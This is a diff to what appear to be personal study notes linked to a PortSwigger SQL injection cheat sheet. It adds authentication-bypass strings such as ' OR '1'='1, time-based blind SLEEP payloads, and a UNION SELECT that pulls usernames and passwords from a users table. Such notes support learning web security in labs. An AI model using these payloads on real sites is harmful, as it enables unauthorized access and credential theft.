@@ -1,10 +1,19 @@
 ---
 
-[[SQL injection cheat sheet]]
+[[Export-d0ccd7da-2475-4121-b1cf-660a33b74a00/Port Swigger/Sql Injection/SQL injection cheat sheet|SQL injection cheat sheet]]
 
 ---
 
-+OR+1=1—
+```Plain
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+sqs' OR '1'='1
+
+# Time-based blind SQLi
+sqs' AND SLEEP(5)--
+sqs' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+```
 
 administrator’—  
 ’ Union Select username , password From users—
